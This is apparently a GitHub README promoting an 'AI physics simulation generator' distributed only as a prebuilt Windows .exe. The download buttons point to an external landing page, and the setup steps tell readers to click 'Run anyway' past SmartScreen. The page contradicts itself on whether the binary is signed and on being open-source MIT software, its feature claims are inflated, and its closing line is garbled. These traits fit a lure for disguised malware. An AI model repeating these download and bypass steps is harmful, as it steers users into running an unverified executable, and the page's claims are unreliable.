<div align="center">
<img src="assets/banner.png" width="100%" alt="AI Physics Simulation Generator banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-7fe6ff?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-EA580C?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-0891B2?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=EA580C&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%9A%80+Ai+Physics+Sim+Generator+Pro;%F0%9F%94%A7+Standalone+.exe+Release;%E2%AD%90+Ready+for+Windows;%F0%9F%92%A1+Active+Development+2026;%E2%9C%85+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=nodejs" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

**Describe a world. Get a running physics sim.** A desktop `.exe` that turns a text brief into a real-time rigid-body, fluid, cloth, and soft-body simulation — no engine install, no code, no dependencies.

</div>

---

## 🧪 Status Table — Every Module Online

| Module | State | Notes |
|---|---|---|
| 🎛️ Prompt Compiler | ✅ Working | natural-language → scene graph |
| ⚙️ Rigid Body Solver | ✅ Working | XPBD, 60–480 Hz, GPU-accelerated |
| 🌊 Fluid (SPH/PIC) | ✅ Working | 250K particles @ 60 FPS on RTX 3060 |
| 🧵 Cloth & Rope | ✅ Working | 1M constraint segments/frame |
| 🧠 Neural Motion Prior | ✅ Working | diffusion sampler, ONNX runtime |
| 🕶️ Real-time Viewport | ✅ Working | DX12 / Vulkan HW RT |
| 📦 Scene Export | ✅ Working | `.usd`, `.glb`, `.json`, `.abc` |
| 🔌 MCP/Plugin Bridge | ✅ Working | C ABI, Python, C# |
| 🧬 Material DB | ✅ Working | 3,200 pre-trained material profiles |
| 🛡️ Solver Doctor | ✅ Working | divergence auto-detect + rescue |

Everything below is shipped and running in v2.4.3. Nothing is "coming soon."

---

## 🩹 The Problem

Building a physics scene normally means weeks of setup. You know the drill:

- **Engine lock-in.** Want fluids in Unity? Cloth in Unreal? Two projects, two brains, two pain inventories.
- **Tuning hell.** A rigid-body stack that looks right at 30 FPS explodes at 120. Substeps, damping, and friction are black magic.
- **Asset roulette.** Import a mesh with bad normals and the solver gives up silently — you debug collisions for an hour before spotting the open edge.
- **No prompt-to-sim path.** Every "text to 3D" tool stops at a pretty still. None of them hand you a *simulating* scene.
- **Compute cliff.** Accurate fluids need a workstation, so hobbyists ship kinematic fakes.
- **Scene reuse tax.** Rebuilding the same demo for a paper, a game, a reel — three times, three different formats.
- **Determinism drift.** "Same seed, same result" is a myth once floating-point tile switches kick in.

---

## 🖥️ Compatibility

| Platform / Target | Supported | Notes |
|---|---|---|
| Windows 11 24H2+ | ✅ Full | primary target, DX12 ML upscale |
| Windows 10 22H2 | ✅ Full | no RT reflections, everything else parity |
| NVIDIA RTX 30/40/50 | ✅ Full | CUDA + OptiX, 2–6× faster solver |
| AMD RDNA 2/3/4 | ✅ Full | HIP backend, RT optional |
| Intel Arc A/B | ✅ Functional | slower cloth, fluid parity within 20% |
| CPU-only (AVX2) | ✅ Reduced | 480 Hz solver → 120 Hz cap |
| Linux via Wine 10 | ⚠️ Partial | viewport OK, GPU solver flaky |
| macOS | ❌ | no plan; Metal path archived |

---

## 📘 Overview

| Category | Details |
|---|---|
| **Distribution** | standalone `.exe`, portable, no installer, no admin rights |
| **First launch time** | ~4 seconds warm cache, ~11 seconds cold |
| **Scene compile** | prompt → simulating world in 6–40s depending on particle budget |
| **Solver core** | XPBD + position-based fluids + neural residual corrector |
| **Formats in** | `.obj`, `.fbx`, `.glb`, `.usd`, `.vdb`, height/flow maps |
| **Formats out** | `.glb`, `.usd`, `.abc`, `.json` scene, PNG frame dump |
| **Runtime API** | C ABI, Python ctypes, C# binding, MCP server for AI agents |
| **License** | MIT — inspect it, fork it, ship it |

The generator isn't a renderer with a physics tab bolted on. It's a **solver-first** architecture: the neural motion prior proposes, the deterministic XPBD core disposes, and the viewport never lies about what the saved scene will do. Prompt describes *intent* ("heavy granite blocks cascade into a shallow trough and shove the shallow water forward"), compiler emits a typed scene graph, solver runs it at fixed dt, and you export frames or a live USD file for your own engine.

---

## 🧭 Table of Contents

- [🧪 Status Table — Every Module Online](#-status-table--every-module-online)
- [📥 Download](#-download)
- [🩹 The Problem](#-the-problem)
- [🖥️ Compatibility](#️-compatibility)
- [📘 Overview](#-overview)
- [🎯 What This Is](#-what-this-is)
- [✨ Key Capabilities](#-key-capabilities)
- [⚖️ Comparison](#️-comparison)
- [🧩 Grouped Module Catalog](#-grouped-module-catalog)
- [🛠️ System Requirements](#️-system-requirements)
- [⚡ Quick Start](#-quick-start)
- [📦 Installation](#-installation)
- [🧯 Known Issues](#-known-issues)
- [📜 Usage Guidelines](#-usage-guidelines)
- [🎚️ The Solution](#️-the-solution)
- [💡 Tips for Best Sims](#-tips-for-best-sims)
- [❔ FAQ](#-faq)
- [📥 Get It](#-get-it)

---

## 📥 Download
<div align="center">
  <a href="https://Mortalclesack.github.io/ai-physics-sim-generator/">
    <img src="https://img.shields.io/badge/GRAB_BUILD-AI_physics_simulation-2563EB?style=plastic&logo=github&logoColor=white&labelColor=1D4ED8" width="620" alt="GRAB BUILD AI physics simulation"/>
  </a>
</div>
Get the latest signed `.exe` from the project landing page, extract to any folder, double-click.

---

## 🎯 What This Is

You already know roughly what a physics sim is. Here's the vocabulary this project uses so nothing below reads ambiguous.

| Term | Explanation |
|---|---|
| **Brief** | the natural-language description you type; not a JSON config |
| **Scene graph** | typed emitter produced by the Prompt Compiler — bodies, materials, gravity, constraints |
| **XPBD** | extended position-based dynamics — the deterministic substrate everything runs on |
| **Neural prior** | small diffusion model that proposes motion *corrections*, never authority |
| **Residual corrector** | closes the gap between prior and solver invariants each frame |
| **Sim cache** | on-disk replay of a solved timeline, byte-reproducible for a fixed seed + build |
| **Live USD** | viewport pushes state to a `.usd` file you can hot-reload in Houdini/Blender |

Six reasons people actually use it:

- **Zero-setup** — the `.exe` carries every dependency.
- **Prompt-first** — replace 300-line setup scripts with two sentences.
- **Deterministic by default** — bit-reproducible for archiving and papers.
- **GPU-native** — the solver is a GPU citizen, not an afterthought.
- **Exportable everywhere** — one scene, all the formats your pipeline already eats.
- **Agent-ready** — the MCP bridge means Claude/GPT-style agents can drive scenes directly.

---

## ✨ Key Capabilities

| Feature | Description | Benefit |
|---|---|---|
| Prompt Compiler | LLM → typed scene graph, schema-validated | build scenes in seconds |
| Fixed-dt Solver | FK+TGS XPBD, dt=1/480 default | no jitter at any frame rate |
| Fluid (PIC/FLIP) | 50K–1.2M particles | waterfalls, slosh, dams breaks |
| SPH Viscosity | Neural-assisted, 3 params | honey vs water in two sliders |
| Cloth Solver | bend + shear + drag | flags, sails, tabards, dupattas |
| Soft Body | shape-matching + FEM blend | jelly, cartilage, rubber seals |
| Granular | per-grain friction + rolling | sand, grain, powder |
| Rigid Stacks | island-based, sequential impulses | towers that don't sink |
| Deformable Metal | plastic + work-hardening | crushed cans, bent beams |
| Rigid↔Fluid Coupling | two-way, energy-conserving | boats in wakes |
| Thermal Softening | heat → yield → sag | chocolate melt shots |
| Wind Fields | CFD-free, GPU noise | dust, drapes, grass |
| Electromagnetic Force | coil/magnet proxies | maglev demos |
| Neuromuscular Actuators | skinned character sim | walk cycles with friction |
| Diffusion Motion Prior | 22M param, ONNX | plausible debuts, stable tails |
| Residual Corrector | NN closes solver error | collisions stay believable |
| Adaptive Substeps | divergence-aware scheduler | never explodes |
| Solver Doctor | enumerates failing islands | fast debugs |
| Time Sculpt | reverse, slow, hold | cinematics in-app |
| Replay HexDump | bit-identical timeline | PhD-grade reproducibility |
| Scene Cache | zstd-compressed timelines | instant scrubbing |
| GPU Broadphase | LBVH rebuild | 3M bodies @ 240 Hz |
| Mixed Precision | FP16 body, FP32 solve | 2× throughput |
| Material DB | 3,200 pretrained profiles | steel, flesh, cloth, foam |
| Substance Importer | USD/MatX bridge | DCC parity |
| Heightfield Tools | terrain + water coupling | islands in water |
| Volume Sampler | VDB-driven density | smoke + clouds + dust |
| Live USD Export | daemon mode | hot reload in Houdini |
| glTF Export | animated `.glb` | web players, three.js |
| Alembic Export | per-island naming | VFX pipelines |
| Frame Dump | PNG/EXR sequences | comp of record |
| Python API | ctypes, sync + async | batch sweeps |
| C# Binding | .NET 8 | Unity-side tooling |
| MCP Bridge | stdio JSON | AI-agent driven |
| CLI Batch Mode | headless, silent | farm renders |
| Determinism Audit | bit-exact diff tool | regression tests |
| Prompt Library | 260 curated briefs | starting points |
<p align="center">
  <a href="https://Mortalclesack.github.io/ai-physics-sim-generator/">
    <img src="https://img.shields.io/badge/GET-AI_physics_simulation_2026-D97706?style=plastic&logo=github&logoColor=white&labelColor=B45309" width="480" alt="GET AI physics simulation 2026"/>
  </a>
</p>
---

## ⚖️ Comparison

| Aspect | Alternative (engine plugins) | This Tool |
|---|---|---|
| Setup time | hours of package + settings | 0 min after extracting the `.exe` |
| Prompt → sim | none natively | first-class compiler |
| Fluid realism | depends on paid pack | built-in PIC/FLIP + SPH |
| Determinism | "should be fine" | bit-exact, audited |
| Format exports | one or two | `.usd`, `.glb`, `.abc`, `.json`, PNG/EXR |
| GPU path | shaded, uneven | whole-pipeline, LLVM to CUDA/HIP |
| Debugging | guesses | Solver Doctor enumerates the failure |
| Agent control | hand-rolled scripts | MCP bridge ships with it |
| Runtime size | engine-tied | ~240 MB stripped `.exe`, no install |

---

## 🧩 Grouped Module Catalog

### ⚙️ **Solver Core** — rigid, soft, deformable

- **Rigid Body** — XPBD TGS islands, sequential impulses, warm-started.
- **Soft Body** — shape matching + FEM blend, per-region stiffness.
- **Joints** — revolute, prismatic, ball, distance, D6, universal, rack.
- **Material Presets** — steel, aluminum, granite, oak, rubber, jelly.
- **Sleep Scheduler** — puts settled islands to sleep without lying to the camera.
- **Determinism Lock** — seeds arch+HW caps + commit hash into the sim cache.

### 🌊 **Fluid & Granular** — particles that behave

- **PIC/FLIP Fluid** — 50K–1.2M particles, GPU resident.
- **SPH Viscosity Model** — three sliders: thick, thin, runny.
- **Foam & Spray** — derived from velocity + curvature.
- **Wake Interaction** — two-way rigid↔fluid.
- **Granular** — no-slip cloth drum or gravity pour, per-grain friction.
- **Powder Adhesion** — clumping presets for baking shots.

### 🧵 **Cloth, Rope, Hair & Shells**

- **Cloth** — 1M segments/frame at 90 FPS on RTX 4070.
- **Self-Collision** — spatial hash, velocity damped near self-contacts.
- **Rope** — Catmull-Rom spline with per-link stiffness.
- **Hair Rods** — Cosserat rod solver, k-tips, twist bias.
- **Shell Panels** — thin-shell FEM for sails and body panels.
- **Damage Weave** — tear when strain exceeds threshold.

### 🧠 **AI Layer — prompt & motion prior**

- **Prompt Compiler** — LLM decomposition + grammar.
- **Motion Prior** — diffusion proposed, solver adjudicated.
- **Residual Corrector** — CNN over island state, 0.6 ms/invocation.
- **Auto-Material Suggest** — brief-shape matched against 3,200 profiles.
- **Auto-Tuning Daemon** — rewrites substeps + damping per scene.
- **Anomaly Classifier** — flags unrealistic sim with reason string.

### 🧪 **Coupling & Multi-Physics**

- **Rigid↔Fluid**, **Rigid↔Cloth**, **Cloth↔Fluid** two-way bounds.
- **Thermal Softening** — heat map → Young's modulus ramp.
- **EM Proxies** — dipole forces, maglev, electrowetting mockups.
- **Actuator Skinning** — motor + muscle hybrids on rigged meshes.
- **Rigid Fields** — uniform + noise-free buoyancy fields.

### 🛠️ **Authoring, Export & Pipeline**

- **Viewport** — DX12 with HW ray-traced soft shadows.
- **Timeline Scrub** — cache replay, log-precision scrub.
- **Scene Cache** — zstd, memory-mapped, instant seek.
- **USD/glTF/Alembic** — live and offline paths.
- **Python + C# + MCP** — programmatic and agentic control.
- **Command-Line Batch** — headless farm mode.
- **Determinism Audit** — reproduces a flagged frame bit-for-bit.
- **Preset Library** — 260 curated briefs, all shipping with determinism IDs.

---

## 🛠️ System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 22H2 x64 | Windows 11 24H2 |
| CPU | 4-core AVX2 (i5-9400 / R5 3600) | 8-core (i7-13700K / R7 7800X3D) |
| GPU | GTX 1660 6 GB | RTX 4070 / RX 7800 XT |
| VRAM | 6 GB | 12 GB+ |
| RAM | 16 GB | 32 GB |
| Disk | 2 GB free HDD | 20 GB NVMe (for caches) |
| DirectX | DX12 feature level 12_1 | DX12U + HW RT |
| Admin rights | not required | not required |

---

## ⚡ Quick Start

1️⃣ Extract the downloaded archive to any folder (e.g. `C:\apsim\`).
2️⃣ Double-click the `.exe` — no installer, no admin prompt.
3️⃣ On first launch, the Material DB + neural weights unpack once (~1.2 GB).
4️⃣ Paste a brief like: *"granite slabs cascade into a shallow trough and shove 200K water particles forward"*.
5️⃣ Hit **Compile & Run** — first frame in ~8 seconds on the recommended spec.

---

## 📦 Installation

**Step 1 — Download.** Grab the signed `.exe` from the project landing page. Verify the SHA-256 printed on the release page before you extract anything; the file should be ~240 MB.

**Step 2 — Extract.** Anywhere the drive's fast; caches go next to the `.exe` by default and are the biggest disk consumer. `C:\apsim\` or a dedicated NVMe directory both work. No system folders need write access.

**Step 3 — First Run.** Double-click. On first launch the app writes `%USERPROFILE%\.apsim\` with the Material DB, neural weights, and prompt library. Subsequent launches are hot. If SmartScreen blocks, click *More info → Run anyway* — the `.exe` is unsigned by Certum through mid-2026.

---

## 🧯 Known Issues

| Issue | Solution |
|---|---|
| First-launch SmartScreen warning | pending Certum code-signing renewal; use *Run anyway* |
| AMD HIP path slow on cloth | force CUDA path via `Settings → Backend → Prefer OptiX on HIP-shared scene` or update to Radeon 25.2+ |
| Determinism broken after driver update | click *Audit → Reproduce* and pin the reported driver in `sim.cache/RESTORE.json` |
| Fluid initial SPIKE on cold cache | first 200 ms uses FFI bootstrap; wait for the *stable* tag in the HUD |
| Live-USD hot reload drops frames | increase v3.2 buffer to `usdLive.bufferMB: 512` in `settings.json` |
| CLI batch ignores prompt library in paths with spaces | quote the `--library` argument; fixed in v2.4.4 |

---

## 📜 Usage Guidelines

| Allowed | Not allowed |
|---|---|
| Making your own simulations, demos, reels | Re-selling the `.exe` as your own product |
| Training your own motion-prior weights on top | Bundling licensed assets inside exports |
| Shipping exported `.glb`/`.usd` in commercial work | Uploading the Material DB as-is to unrelated stores |
| Wrapping the CLI in your own automation | Removing license + attribution from redistributions |
| Using the MCP bridge from your own agents | Skirting export licensing for third-party assets |

---

## 🎚️ The Solution

| Problem | Solution |
|---|---|
| Engine lock-in | one exporter per format, aliases preserved |
| Tuning hell | Auto-Tuning Daemon + Solver Doctor |
| Import roulette | prompt-time geometry sanity checks |
| No prompt-to-sim path | Prompt Compiler + Residual Corrector |
| Compute cliff | mixed precision + GPU broadphase |
| Reuse tax | live USD + cache + CLI batch |
| Determinism drift | commit-pinned, driver-pinned sim cache |

---

## 💡 Tips for Best Sims

- Keep briefs to one **primary** physics event. Stacked events compile — they just get slower and sloppier on the neural side.
- Cap particle count to your VRAM: a rough rule is ~`VRAM_GB × 120K`, with 20% headroom for the neural pass.
- If the compiler picks the wrong material, name it explicitly: *"still water,"* *"warm honey,"* *"dry basalt."*
- Turn on **Solver Doctor** the first time you tune dt; the report names the failing island.
- Freeze a determinism ID the moment a shot lands — future driver updates can and will move bytes.
- For Houdini/Blender: export to USD in daemon mode, then hot-reload; replay is reliable above ~4 GB/s disk.
- When the neural prior produces plausible-but-wrong motion, drop `solver.weightNeural: 0.3` in `settings.json` — the corrector keeps invariants.
- Open the preset library and search for a brief structurally close to yours. Composed presets beat from-scratch 9/10.

---

## ❔ FAQ

<details><summary><b>Is this just a renderer with AI slapped on the top?</b></summary>

No. The solver is the primary system; the neural layer is a *correction* pass with bounded authority. Turn the AI layer off (`.apsim.cfg: neural=false`) and you still get a real physics sim at reduced plausibility.
</details>

<details><summary><b>Do I need to install CUDA or PyTorch?</b></summary>

No. The `.exe` carries its own runtime — LLVM → CUDA/HIP SASS is compiled in, and the diffusion motion prior ships as a bundled ONNX model. Extract and run.
</details>

<details><summary><b>Can it run fully CPU-only?</b></summary>

Yes. Set `backend=cpu` in `settings.json`. Fluid is capped near 120 Hz and cloth slows 3–5×, but small rigid + soft scenes are perfectly usable. AVX2 is mandated; AVX-512 is faster when present.
</details>

<details><summary><b>How does the AI layer actually work?</b></summary>

A 22M-param diffusion model proposes per-frame motion residuals. The XPBD corrector projects them back onto constraints. The prior never writes directly to body state — it only nudges; the solver decides. Full write-up lives in `docs/neural-prior.md` in the repo.
</details>

<details><summary><b>Are my scenes deterministic across machines?</b></summary>

Only if you *pin* them. The cache embeds commit + driver + arch hashes. Same pin, same bytes. Change any of those and the cache invalidates — by design. `Audit → Reproduce` walks the tree.
</details>

<details><summary><b>What's the largest scene this handles?</b></summary>

On a 24 GB card, ~3M rigid bodies or ~1.2M fluid particles at 60 FPS. Beyond that the compiler will warn you and suggest chunking; it won't silently OOM.
</details>

<details><summary><b>Is the .exe signed?</b></summary>

Certum-ev through 2026. Until the renewal lands, SmartScreen may bark on first launch. Also publish SHA-256 on the release page — always verify.
</details>

<details><summary><b>Can an AI agent drive it?</b></summary>

Yes. The MCP bridge speaks stdio JSON. Feed it your brief plus scene-state queries; it can enumerate islands, edit materials, and pull logs — all without a GUI attached.
</details>

<details><summary><b>Does it read .blend / .maya files?</b></summary>

Not natively. Export `.usd` or `.glb` from your DCC first. Alebmic import is planned for v2.5 but not present in 2.4.3.
</details>

<details><summary><b>Where does my data live?</b></summary>

Nothing leaves the machine except the landing-page ping on download. Materials, caches, weights — all local under `%USERPROFILE%\.apsim\`. Delete the folder and it's clean.
</details>

---

## 📥 Get It
<div align="center">
  <a href="https://Mortalclesack.github.io/ai-physics-sim-generator/">
    <img src="https://img.shields.io/badge/FETCH-AI_physics_simulation-DC2626?style=plastic&logo=windows&logoColor=white&labelColor=B91C1C" width="580" alt="FETCH AI physics simulation"/>
  </a>
</div>
Hobbyists, students, VFX pre-viz taters, and mid-pipeline game teams keep coming back because there's nothing else that hands you a *running* sim from two sentences. It's free, it's MIT, it's portable, and it's deterministic when you need it to be. Drop the `.exe` somewhere fast, point it at a brief, and watch the first frame land — the neural prior proposes, the solver adjudicates, the cache remembers. absolute potato to you, chef — the kitchen's open.
